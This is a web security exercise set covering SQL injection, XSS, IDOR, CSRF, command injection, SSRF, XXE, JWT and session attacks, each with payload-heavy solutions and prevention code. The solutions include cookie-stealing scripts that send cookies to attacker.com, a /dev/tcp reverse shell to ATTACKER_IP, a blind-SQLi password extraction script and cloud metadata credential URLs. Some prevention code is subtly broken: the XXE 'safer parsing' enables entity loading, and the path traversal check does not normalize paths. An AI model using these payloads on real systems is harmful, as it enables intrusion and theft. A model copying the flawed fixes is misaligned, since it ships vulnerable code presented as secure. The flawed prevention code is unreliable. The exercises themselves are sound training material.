# Web Security Exercises

Hands-on exercises to practice ethical hacking and web security concepts. Each exercise includes objectives, hints, and detailed solutions.

## ⚠️ Ethical Guidelines

**IMPORTANT**: These exercises are for educational purposes only!
- ✅ Practice on these exercises and authorized platforms
- ✅ Use knowledge to improve security
- ✅ Report vulnerabilities responsibly
- ❌ Never attack systems without permission
- ❌ Never use these techniques maliciously

## 📚 Exercise Categories

1. [SQL Injection](#sql-injection-exercises)
2. [Cross-Site Scripting (XSS)](#xss-exercises)
3. [Broken Access Control](#broken-access-control-exercises)
4. [CSRF](#csrf-exercises)
5. [Command Injection](#command-injection-exercises)
6. [SSRF](#ssrf-exercises)

---

## 💉 SQL Injection Exercises

### Exercise 1: Basic Authentication Bypass (Easy)
**Objective**: Bypass login authentication using SQL injection.

**Scenario**: You have a login form with username and password fields. The backend uses:
```php
$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
```

**Challenge**: Log in as admin without knowing the password.

**Hints**:
<details>
<summary>Click for Hint 1</summary>
SQL comments can terminate the rest of the query. Try using -- or #
</details>

<details>
<summary>Click for Hint 2</summary>
What happens if you make the password check irrelevant?
</details>

<details>
<summary>Click for Solution</summary>

**Solution**:
Enter the following in the username field:
```
admin' --
```
Or:
```
admin'#
```

**Explanation**:
The query becomes:
```sql
SELECT * FROM users WHERE username = 'admin' --' AND password = ''
```
Everything after `--` is commented out, so the password check is bypassed.

**Alternative payloads**:
```
admin' OR '1'='1
' OR 1=1 --
admin' OR 1=1#
```
</details>

---

### Exercise 2: UNION-Based SQL Injection (Medium)
**Objective**: Extract data from the database using UNION SELECT.

**Scenario**: A vulnerable product search page:
```php
$query = "SELECT name, price FROM products WHERE category = '$category'";
```

**Challenge**: 
1. Determine the number of columns
2. Find which columns are displayed
3. Extract the database name
4. List all tables
5. Extract usernames and passwords from the users table

**Hints**:
<details>
<summary>Click for Hint 1</summary>
Use ORDER BY to find the number of columns
</details>

<details>
<summary>Click for Hint 2</summary>
Use UNION SELECT with NULL values
</details>

<details>
<summary>Click for Solution</summary>

**Step-by-step solution**:

1. **Find number of columns**:
```sql
' ORDER BY 1 --
' ORDER BY 2 --
' ORDER BY 3 --  (error means 2 columns)
```

2. **Test UNION SELECT**:
```sql
' UNION SELECT NULL, NULL --
' UNION SELECT 'test', 'test' --
```

3. **Extract database name**:
```sql
' UNION SELECT database(), NULL --
```

4. **List tables**:
```sql
' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database() --
```

5. **List columns in users table**:
```sql
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users' --
```

6. **Extract user data**:
```sql
' UNION SELECT username, password FROM users --
' UNION SELECT CONCAT(username,':',password), NULL FROM users --
```
</details>

---

### Exercise 3: Blind SQL Injection (Hard)
**Objective**: Extract data when no output is visible using time-based techniques.

**Scenario**: A password reset page checks if an email exists but doesn't show any output:
```php
$query = "SELECT * FROM users WHERE email = '$email'";
// No output displayed, only "Reset link sent" or "Email not found"
```

**Challenge**: Determine if the admin user's password starts with 'a'.

**Hints**:
<details>
<summary>Click for Hint 1</summary>
Use SLEEP() function to cause delays
</details>

<details>
<summary>Click for Hint 2</summary>
Use SUBSTRING() to check password character by character
</details>

<details>
<summary>Click for Solution</summary>

**Boolean-based blind SQLi**:
```sql
admin@example.com' AND '1'='1
admin@example.com' AND '1'='2
```

**Time-based blind SQLi**:
```sql
' OR IF(1=1, SLEEP(5), 0) --
```

**Extract password character by character**:
```sql
' OR IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a', SLEEP(5), 0) --
```

**Python script to automate**:
```python
import requests
import time

def check_char(position, char):
    payload = f"' OR IF(SUBSTRING((SELECT password FROM users WHERE username='admin'),{position},1)='{char}', SLEEP(3), 0) --"
    start = time.time()
    requests.post('http://target.com/reset', data={'email': payload})
    elapsed = time.time() - start
    return elapsed > 3

password = ""
for pos in range(1, 20):
    for char in 'abcdefghijklmnopqrstuvwxyz0123456789':
        if check_char(pos, char):
            password += char
            print(f"Password so far: {password}")
            break
```
</details>

---

## 🎭 XSS Exercises

### Exercise 4: Reflected XSS (Easy)
**Objective**: Execute JavaScript through a search parameter.

**Scenario**: A search page displays your search term:
```php
echo "You searched for: " . $_GET['search'];
```

**Challenge**: Make an alert box pop up with "XSS".

**Hints**:
<details>
<summary>Click for Hint 1</summary>
Use the &lt;script&gt; tag
</details>

<details>
<summary>Click for Solution</summary>

**Basic payload**:
```html
<script>alert('XSS')</script>
```

**URL**:
```
http://target.com/search?search=<script>alert('XSS')</script>
```

**Alternative payloads**:
```html
<img src=x onerror="alert('XSS')">
<svg onload="alert('XSS')">
<body onload="alert('XSS')">
<iframe src="javascript:alert('XSS')">
```

**Cookie stealing payload**:
```html
<script>
fetch('http://attacker.com/steal?cookie=' + document.cookie);
</script>
```
</details>

---

### Exercise 5: Stored XSS (Medium)
**Objective**: Store malicious JavaScript in the database.

**Scenario**: A comment system stores user comments:
```php
// Store comment
$comment = $_POST['comment'];
mysqli_query($conn, "INSERT INTO comments (text) VALUES ('$comment')");

// Display comments
echo $row['text'];
```

**Challenge**: 
1. Store a comment that alerts "XSS" for every visitor
2. Store a comment that steals cookies
3. Bypass a basic filter that blocks `<script>`

**Hints**:
<details>
<summary>Click for Hint 1</summary>
Stored XSS persists in the database
</details>

<details>
<summary>Click for Hint 2</summary>
Try alternative event handlers if script tags are blocked
</details>

<details>
<summary>Click for Solution</summary>

**Basic stored XSS**:
```html
<script>alert('XSS')</script>
```

**Cookie stealer**:
```html
<script>
var img = new Image();
img.src = 'http://attacker.com/steal.php?cookie=' + document.cookie;
</script>
```

**Bypass `<script>` filter**:
```html
<img src=x onerror="alert('XSS')">
<svg/onload="alert('XSS')">
<iframe src="javascript:alert('XSS')">
```

**Bypass filter with case variations**:
```html
<ScRiPt>alert('XSS')</sCrIpT>
<SCRIPT>alert('XSS')</SCRIPT>
```

**Bypass with encoding**:
```html
<img src=x onerror="eval(String.fromCharCode(97,108,101,114,116,40,39,88,83,83,39,41))">
```
</details>

---

### Exercise 6: DOM-Based XSS (Hard)
**Objective**: Exploit client-side JavaScript vulnerabilities.

**Scenario**: JavaScript code processes URL fragment:
```javascript
var hash = window.location.hash.substring(1);
document.getElementById('welcome').innerHTML = "Welcome " + hash;
```

**Challenge**: Execute JavaScript without using the word "script".

**Hints**:
<details>
<summary>Click for Hint 1</summary>
The hash is never sent to the server, only processed client-side
</details>

<details>
<summary>Click for Solution</summary>

**Basic DOM XSS**:
```
http://target.com/page#<img src=x onerror="alert('XSS')">
```

**Without using common tags**:
```
http://target.com/page#<svg/onload="alert('XSS')">
http://target.com/page#<body onload="alert('XSS')">
```

**Advanced payload**:
```javascript
// URL: http://target.com/#<img src=x onerror="this.src='http://attacker.com/steal?cookie='+document.cookie">
```

**Prevention**:
```javascript
// Use textContent instead of innerHTML
document.getElementById('welcome').textContent = "Welcome " + hash;

// Or sanitize
var sanitized = hash.replace(/[<>]/g, '');
document.getElementById('welcome').innerHTML = "Welcome " + sanitized;
```
</details>

---

## 🔓 Broken Access Control Exercises

### Exercise 7: IDOR (Insecure Direct Object Reference) (Easy)
**Objective**: Access other users' data by manipulating IDs.

**Scenario**: A profile page URL:
```
http://example.com/profile?user_id=123
```

**Challenge**: 
1. View user ID 456's profile
2. Access admin (user_id=1) profile
3. Modify user ID 789's email

**Hints**:
<details>
<summary>Click for Hint 1</summary>
Simply change the user_id parameter
</details>

<details>
<summary>Click for Solution</summary>

**View other users**:
```
http://example.com/profile?user_id=456
http://example.com/profile?user_id=1
```

**Modify data (if PUT/POST available)**:
```bash
curl -X PUT http://example.com/profile?user_id=789 \
  -d "email=attacker@evil.com"
```

**Prevention**:
```python
@app.route('/profile')
@login_required
def profile():
    user_id = request.args.get('user_id')
    
    # Check authorization
    if current_user.id != user_id and not current_user.is_admin:
        abort(403)
    
    user = User.query.get_or_404(user_id)
    return render_template('profile.html', user=user)
```
</details>

---

### Exercise 8: Privilege Escalation (Medium)
**Objective**: Escalate from regular user to admin.

**Scenario**: User roles are stored in a hidden form field:
```html
<form action="/update_profile" method="POST">
    <input type="hidden" name="role" value="user">
    <input type="text" name="username">
    <button>Update</button>
</form>
```

**Challenge**: Modify your role to "admin".

**Hints**:
<details>
<summary>Click for Hint 1</summary>
Use browser developer tools to modify the hidden field
</details>

<details>
<summary>Click for Hint 2</summary>
Or use Burp Suite to intercept and modify the request
</details>

<details>
<summary>Click for Solution</summary>

**Method 1: Browser DevTools**:
1. Open Developer Tools (F12)
2. Find the hidden input field
3. Change value from "user" to "admin"
4. Submit the form

**Method 2: Burp Suite**:
1. Intercept the request
2. Modify: `role=user` to `role=admin`
3. Forward the request

**Method 3: cURL**:
```bash
curl -X POST http://example.com/update_profile \
  -d "username=myuser&role=admin" \
  -b "session=YOUR_SESSION_COOKIE"
```

**Prevention**:
```python
@app.route('/update_profile', methods=['POST'])
@login_required
def update_profile():
    username = request.form['username']
    
    # NEVER trust client-side data for authorization
    # Retrieve role from server-side session
    user = User.query.get(current_user.id)
    user.username = username
    # Role should NEVER be modifiable by user
    db.session.commit()
```
</details>

---

### Exercise 9: Path Traversal (Medium)
**Objective**: Access files outside the intended directory.

**Scenario**: A file download endpoint:
```php
$file = $_GET['file'];
readfile("/var/www/uploads/" . $file);
```

**Challenge**: Read `/etc/passwd` file.

**Hints**:
<details>
<summary>Click for Hint 1</summary>
Use ../ to go up directories
</details>

<details>
<summary>Click for Solution</summary>

**Basic path traversal**:
```
http://example.com/download?file=../../../../../etc/passwd
```

**Bypass filtering of "../"**:
```
..././..././..././etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc%2fpasswd  (URL encoded)
..%252f..%252f..%252fetc%252fpasswd  (double encoded)
```

**Read application config**:
```
http://example.com/download?file=../../../../var/www/config.php
```

**Prevention**:
```python
import os

@app.route('/download')
def download():
    filename = request.args.get('file')
    
    # Use whitelist
    allowed_files = ['report.pdf', 'invoice.pdf']
    if filename not in allowed_files:
        abort(404)
    
    # Or validate path
    safe_path = os.path.join('/var/www/uploads', filename)
    if not safe_path.startswith('/var/www/uploads'):
        abort(403)
    
    return send_file(safe_path)
```
</details>

---

## 🔐 CSRF Exercises

### Exercise 10: CSRF Token Bypass (Medium)
**Objective**: Perform CSRF attack on a money transfer.

**Scenario**: A bank transfer form without CSRF protection:
```html
<form action="http://bank.com/transfer" method="POST">
    <input name="to" value="">
    <input name="amount" value="">
</form>
```

**Challenge**: Create a malicious page that transfers $1000 to attacker account.

**Hints**:
<details>
<summary>Click for Hint 1</summary>
Create an auto-submitting form
</details>

<details>
<summary>Click for Solution</summary>

**Malicious HTML page**:
```html
<!DOCTYPE html>
<html>
<head>
    <title>Cute Cats!</title>
</head>
<body>
    <h1>Loading cute cats...</h1>
    
    <!-- Hidden CSRF form -->
    <form id="csrf" action="http://bank.com/transfer" method="POST" style="display:none;">
        <input name="to" value="attacker">
        <input name="amount" value="1000">
    </form>
    
    <script>
        // Auto-submit on page load
        document.getElementById('csrf').submit();
    </script>
</body>
</html>
```

**Image-based CSRF (GET requests)**:
```html
<img src="http://bank.com/transfer?to=attacker&amount=1000" style="display:none;">
```

**Prevention**:
```python
from flask_wtf.csrf import CSRFProtect

csrf = CSRFProtect(app)

# Template
<form method="POST">
    {{ csrf_token() }}
    <input name="to">
    <input name="amount">
    <button>Transfer</button>
</form>

# Server validates token automatically
```
</details>

---

## 💻 Command Injection Exercises

### Exercise 11: OS Command Injection (Easy)
**Objective**: Execute arbitrary OS commands.

**Scenario**: A ping utility:
```php
$host = $_GET['host'];
system("ping -c 4 " . $host);
```

**Challenge**: 
1. List files in the current directory
2. Read `/etc/passwd`
3. Start a reverse shell

**Hints**:
<details>
<summary>Click for Hint 1</summary>
Use ; or && to chain commands
</details>

<details>
<summary>Click for Solution</summary>

**List files**:
```
http://example.com/ping?host=google.com; ls -la
http://example.com/ping?host=google.com && ls -la
```

**Read files**:
```
http://example.com/ping?host=google.com; cat /etc/passwd
```

**Command substitution**:
```
http://example.com/ping?host=`whoami`
http://example.com/ping?host=$(cat /etc/passwd)
```

**Reverse shell**:
```bash
# Attacker machine
nc -lvp 4444

# Payload
http://example.com/ping?host=google.com; bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

**Prevention**:
```python
import subprocess
import shlex

@app.route('/ping')
def ping():
    host = request.args.get('host')
    
    # Whitelist validation
    if not re.match(r'^[a-zA-Z0-9.-]+$', host):
        abort(400, "Invalid host")
    
    # Use safe subprocess
    try:
        result = subprocess.run(
            ['ping', '-c', '4', host],
            capture_output=True,
            text=True,
            timeout=5
        )
        return result.stdout
    except subprocess.TimeoutExpired:
        return "Timeout"
```
</details>

---

## 🌐 SSRF Exercises

### Exercise 12: SSRF to Internal Network (Hard)
**Objective**: Access internal services through SSRF.

**Scenario**: Image proxy service:
```python
@app.route('/fetch')
def fetch():
    url = request.args.get('url')
    response = requests.get(url)
    return response.content
```

**Challenge**: 
1. Access localhost services
2. Read AWS metadata
3. Scan internal network

**Hints**:
<details>
<summary>Click for Hint 1</summary>
Try localhost, 127.0.0.1, or 169.254.169.254
</details>

<details>
<summary>Click for Solution</summary>

**Access internal services**:
```
http://example.com/fetch?url=http://localhost:22
http://example.com/fetch?url=http://127.0.0.1:6379  (Redis)
http://example.com/fetch?url=http://localhost:3306  (MySQL)
```

**AWS metadata**:
```
http://example.com/fetch?url=http://169.254.169.254/latest/meta-data/
http://example.com/fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
```

**Read local files**:
```
http://example.com/fetch?url=file:///etc/passwd
http://example.com/fetch?url=file:///var/www/config.php
```

**Bypass localhost filtering**:
```
http://127.1
http://0.0.0.0
http://localhost.example.com  (if DNS points to 127.0.0.1)
http://[::1]  (IPv6 localhost)
http://127.0.0.1.nip.io
```

**Prevention**:
```python
from urllib.parse import urlparse
import ipaddress

ALLOWED_DOMAINS = ['cdn.example.com', 'images.example.com']

@app.route('/fetch')
def fetch():
    url = request.args.get('url')
    parsed = urlparse(url)
    
    # Check scheme
    if parsed.scheme not in ['http', 'https']:
        abort(400, "Invalid scheme")
    
    # Check domain whitelist
    if parsed.hostname not in ALLOWED_DOMAINS:
        abort(400, "Domain not allowed")
    
    # Block internal IPs
    try:
        ip = ipaddress.ip_address(parsed.hostname)
        if ip.is_private or ip.is_loopback:
            abort(400, "Private IPs not allowed")
    except ValueError:
        pass  # Not an IP, continue
    
    response = requests.get(url, timeout=5)
    return response.content
```
</details>

---

## 🔀 XXE Exercises

### Exercise 13: XML External Entity (Medium)
**Objective**: Exploit XXE to read local files.

**Scenario**: An XML API endpoint:
```php
$xml = simplexml_load_string($_POST['xml']);
echo "Hello " . $xml->name;
```

**Challenge**: Read `/etc/passwd` using XXE.

**Hints**:
<details>
<summary>Click for Hint 1</summary>
Define an external entity in the DOCTYPE
</details>

<details>
<summary>Click for Solution</summary>

**Basic XXE payload**:
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <name>&xxe;</name>
</root>
```

**Read PHP files (with base64 encoding to avoid parse errors)**:
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=config.php">
]>
<root>
  <name>&xxe;</name>
</root>
```

**SSRF via XXE**:
```xml
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://localhost:6379/INFO">
]>
<root>
  <name>&xxe;</name>
</root>
```

**Prevention**:
```php
// Disable external entities
libxml_disable_entity_loader(true);
$xml = simplexml_load_string($_POST['xml']);

// Or use safer parsing
$dom = new DOMDocument();
$dom->loadXML($xml, LIBXML_NOENT | LIBXML_DTDLOAD | LIBXML_DTDATTR);
```
</details>

---

## 🔐 Advanced Authentication Exercises

### Exercise 14: JWT Token Manipulation (Hard)
**Objective**: Exploit JWT vulnerabilities.

**Scenario**: Application uses JWT for authentication:
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiam9obiIsInJvbGUiOiJ1c2VyIn0.signature
```

**Challenges**:
1. Change role from "user" to "admin"
2. Exploit "none" algorithm
3. Crack weak secret

**Hints**:
<details>
<summary>Click for Hint 1</summary>
JWT has three parts: header.payload.signature
</details>

<details>
<summary>Click for Hint 2</summary>
Try changing the algorithm to "none"
</details>

<details>
<summary>Click for Solution</summary>

**Decode JWT**:
```bash
# Header (base64 decode)
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
# {"alg":"HS256","typ":"JWT"}

# Payload
echo "eyJ1c2VyIjoiam9obiIsInJvbGUiOiJ1c2VyIn0" | base64 -d
# {"user":"john","role":"user"}
```

**Attack 1: Algorithm Confusion (none)**:
```json
// New header
{"alg":"none","typ":"JWT"}
// Base64: eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0

// New payload
{"user":"john","role":"admin"}
// Base64: eyJ1c2VyIjoiam9obiIsInJvbGUiOiJhZG1pbiJ9

// Final JWT (no signature)
eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiam9obiIsInJvbGUiOiJhZG1pbiJ9.
```

**Attack 2: Weak Secret Brute Force**:
```bash
# Using hashcat
hashcat -a 0 -m 16500 jwt.txt wordlist.txt

# Using john
john jwt.txt --wordlist=rockyou.txt

# Python script
import jwt

token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiam9obiIsInJvbGUiOiJ1c2VyIn0.signature"
wordlist = open('wordlist.txt', 'r')

for secret in wordlist:
    secret = secret.strip()
    try:
        decoded = jwt.decode(token, secret, algorithms=['HS256'])
        print(f"Secret found: {secret}")
        break
    except jwt.InvalidSignatureError:
        pass
```

**Attack 3: Algorithm Confusion (RS256 to HS256)**:
```python
# If server uses RSA public key, try forcing HMAC with the public key
import jwt

# Get public key from server
public_key = open('public.pem', 'r').read()

payload = {"user": "john", "role": "admin"}
token = jwt.encode(payload, public_key, algorithm='HS256')
```

**Prevention**:
```python
import jwt

# Always specify algorithm
try:
    decoded = jwt.decode(token, SECRET_KEY, algorithms=['HS256'])
except jwt.InvalidTokenError:
    abort(401)

# Use strong secrets
SECRET_KEY = os.urandom(32)

# Better: Use RS256 with proper key management
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import rsa

private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
token = jwt.encode(payload, private_key, algorithm='RS256')
```
</details>

---

### Exercise 15: Session Fixation (Medium)
**Objective**: Fix a user's session ID before they log in.

**Scenario**: Application doesn't regenerate session on login:
```php
session_start();
if (login($_POST['username'], $_POST['password'])) {
    $_SESSION['user'] = $_POST['username'];
}
```

**Challenge**: Make victim use your session ID.

**Hints**:
<details>
<summary>Click for Hint 1</summary>
Set the victim's session cookie before they log in
</details>

<details>
<summary>Click for Solution</summary>

**Attack Steps**:
1. Get a valid session ID from the application
2. Send victim a link with that session ID
3. When victim logs in, you share their session

**Method 1: URL Parameter**:
```
http://example.com/login?PHPSESSID=attacker_session_id
```

**Method 2: Cookie Injection (if subdomain)**:
```html
<!-- From attacker.example.com -->
<script>
document.cookie = "PHPSESSID=attacker_session_id; domain=.example.com";
window.location = "http://example.com/login";
</script>
```

**Method 3: XSS**:
```html
<script>
document.cookie = "PHPSESSID=attacker_session_id";
</script>
```

**Prevention**:
```php
session_start();

if (login($_POST['username'], $_POST['password'])) {
    // Regenerate session ID after login
    session_regenerate_id(true);
    $_SESSION['user'] = $_POST['username'];
    
    // Also store initial IP and user agent
    $_SESSION['ip'] = $_SERVER['REMOTE_ADDR'];
    $_SESSION['user_agent'] = $_SERVER['HTTP_USER_AGENT'];
}

// Validate session on each request
if (isset($_SESSION['ip']) && $_SESSION['ip'] !== $_SERVER['REMOTE_ADDR']) {
    session_destroy();
    die('Session hijacking detected');
}
```
</details>

---

## 🌐 API Security Exercises

### Exercise 16: API Rate Limiting Bypass (Medium)
**Objective**: Bypass rate limiting on an API endpoint.

**Scenario**: API has rate limit of 10 requests per minute per IP.

**Challenge**: Make 100 requests in one minute.

**Hints**:
<details>
<summary>Click for Hint 1</summary>
Try using different headers like X-Forwarded-For
</details>

<details>
<summary>Click for Solution</summary>

**Method 1: IP Spoofing Headers**:
```bash
for i in {1..100}; do
    curl -H "X-Forwarded-For: 1.2.3.$i" http://api.example.com/endpoint
done
```

**Common headers to try**:
```
X-Forwarded-For: 1.2.3.4
X-Real-IP: 1.2.3.4
X-Originating-IP: 1.2.3.4
X-Remote-IP: 1.2.3.4
X-Client-IP: 1.2.3.4
```

**Method 2: Multiple User-Agents**:
```python
import requests

user_agents = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)',
    'Mozilla/5.0 (X11; Linux x86_64)',
]

for i in range(100):
    ua = user_agents[i % len(user_agents)]
    requests.get('http://api.example.com/endpoint', 
                 headers={'User-Agent': ua})
```

**Method 3: Different API Endpoints**:
```bash
# If rate limit is per endpoint
curl http://api.example.com/v1/data
curl http://api.example.com/v2/data  # Different rate limit
```

**Prevention**:
```python
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address

# Don't trust client headers
limiter = Limiter(
    app,
    key_func=get_remote_address,  # Use actual IP
    default_limits=["10 per minute"]
)

# Or implement custom logic
from functools import wraps
import redis

redis_client = redis.Redis()

def rate_limit(max_requests=10, window=60):
    def decorator(f):
        @wraps(f)
        def wrapped(*args, **kwargs):
            # Use actual connection IP, not headers
            ip = request.environ.get('REMOTE_ADDR')
            key = f"rate_limit:{ip}:{f.__name__}"
            
            current = redis_client.get(key)
            if current and int(current) >= max_requests:
                abort(429, "Rate limit exceeded")
            
            pipe = redis_client.pipeline()
            pipe.incr(key)
            pipe.expire(key, window)
            pipe.execute()
            
            return f(*args, **kwargs)
        return wrapped
    return decorator

@app.route('/api/data')
@rate_limit(max_requests=10, window=60)
def api_data():
    return jsonify({"data": "value"})
```
</details>

---

## 🎯 Additional Practice Resources

### Beginner Level
- **[Hacksplaining](https://www.hacksplaining.com/lessons)** - Interactive lessons
- **[OWASP WebGoat](https://owasp.org/www-project-webgoat/)** - Guided exercises
- **[DVWA](http://www.dvwa.co.uk/)** - Multiple difficulty levels

### Intermediate Level
- **[PortSwigger Web Security Academy](https://portswigger.net/web-security)** - Free labs
- **[HackTheBox](https://www.hackthebox.eu/)** - Web challenges
- **[TryHackMe](https://tryhackme.com/)** - Structured learning paths

### Advanced Level
- **[PentesterLab](https://pentesterlab.com/)** - Professional exercises
- **[HackerOne CTF](https://ctf.hacker101.com/)** - Real-world scenarios
- **Bug Bounty Programs** - Practice on authorized targets

---

## 📖 Next Steps

After completing these exercises:

1. **Try Real Platforms**: Practice on OWASP WebGoat and Juice Shop
2. **Read Write-ups**: Study how others solve challenges
3. **Learn Tools**: Master Burp Suite, OWASP ZAP
4. **Bug Bounty**: Start with beginner-friendly programs
5. **Stay Updated**: Follow security researchers and blogs

## 🛡️ Defense Practice

Don't just learn attacks! Practice defense by:
- Reviewing the prevention code in solutions
- Implementing security controls
- Code reviewing for vulnerabilities
- Setting up WAF rules
- Configuring security headers

---

**Remember**: Great power comes with great responsibility. Use these skills ethically!
